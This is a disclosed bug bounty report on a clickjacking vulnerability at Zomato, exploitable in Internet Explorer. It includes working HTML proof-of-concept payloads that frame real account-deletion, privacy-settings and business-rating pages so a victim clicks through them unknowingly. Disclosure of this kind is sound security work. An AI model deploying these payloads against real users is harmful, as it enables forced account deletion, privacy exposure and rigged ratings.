# Clickjacking: Delete Account, Change privacy settings, Rate business, follow/unfollow (IE)

## Report Details
- **Report ID**: 338569
- **URL**: https://hackerone.com/reports/338569
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-04-15T15:07:45.210Z
- **Disclosed**: 2018-04-15T19:04:34.992Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Inspired by report #337219. Please note that this report includes a clear security impact as well as a proof of concept. 

CVSS
----

medium 5.0 [CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)

Description
-----------

The application does not send a X-Frame-Options header, thus allowing pages to be included in iFrames.

There are some specific actions which can be performed with clicks:

- DOS: Deleting an account (requires 3 clicks)
- Confidentiality/Integrity: Change privacy & notification settings (disabling of "Hide my profile from search engines" / "Prevent my profile from showing up in search results" as well as enabling/disabling of newsletters)
- Integrity: Following/Unfollowing users (requires 1 click), Rating a business (requires 2 clicks), Changing the language of the site, etc. Among other, a business could use this to influence its own rating.

Note that attacks will only work in Internet Explorer.  The CSP directive `frame-ancestors` will prevent inclusion of the page in frames in Firefox and Chrome.

Proof of Concept
----------------

Rate a business:

    <div style="position: absolute; left: 430px; top: 490px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 650px; top: 535px; pointer-events: none;">Click 2</div>
    <iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/szczecin/bajgle-kr%C3%B3la-jana-%C5%9Br%C3%B3dmie%C5%9Bcie"></iframe>

The following proof of concepts are specific to one user (in this example with the ID 53373042). A general POC which can be reused across users would require two more clicks (opening the menu drop-down + click on settings).

Delete an Account:

    <div style="position: absolute; left: 70px; top: 860px; pointer-events: none;">Click 1</div>
    <div style="position: absolute; left: 330px; top: 600px; pointer-events: none;">Click 2 & 3</div>
    <iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/users/simone-eisenberg-53373042/edit"></iframe>

Change privacy settings: 

	<div style="position: absolute; left: 70px; top: 825px; pointer-events: none;">Click 1</div>
	<div style="position: absolute; left: 295px; top: 900px; pointer-events: none;">Click 2</div>
	<iframe style="opacity: 0.2;" height="1000" width="1000" scrolling="no" src="https://www.zomato.com/users/simone-eisenberg-53453315/edit"></iframe>

Tested with IE11. Note that the script needs to be called on a real domain - not from a local file - as IE will otherwise not send the required cookies.

In a real attack, the zomato page would not be displayed. Javascript could also be used to automatically follow the users mouse pointer, so that a user would only need to click x times anywhere on a page instead of needing to click the specific labels.

## Impact

Delete Account, change privacy settings, rate a business, follow/unfollow, etc.

The hacker selected the **UI Redressing (Clickjacking)** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.zomato.com/

**Can a victim be tricked into unknowingly initiating a specific action?**
Yes

**What specific action can the user be tricked into?**
Delete Account, change privacy settings, rate a business, follow/unfollow, etc.

## Attachments
- zomato-clickjacking.png
